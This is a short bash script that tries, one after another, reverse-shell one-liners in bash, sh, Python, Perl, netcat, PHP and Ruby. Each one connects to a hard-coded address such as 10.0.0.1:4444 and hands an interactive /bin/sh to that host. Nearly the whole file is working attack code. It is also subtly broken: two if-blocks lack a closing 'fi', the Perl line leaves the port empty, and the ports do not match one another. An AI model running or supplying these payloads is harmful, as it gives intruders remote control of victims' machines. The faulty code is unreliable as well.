#!/bin/bash
# Bash script that will try multiple ways to get a reverse shell

if command -v bash > /dev/null 2>&1; then
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1
        exit;

if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.2.37",6543)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="10.0.0.1";$p=;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
        exit;
fi

if command -v php > /dev/null 2>&1; then
        php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
        exit;
fi

if command -v ruby > /dev/null 2>&1; then
        ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
        exit;
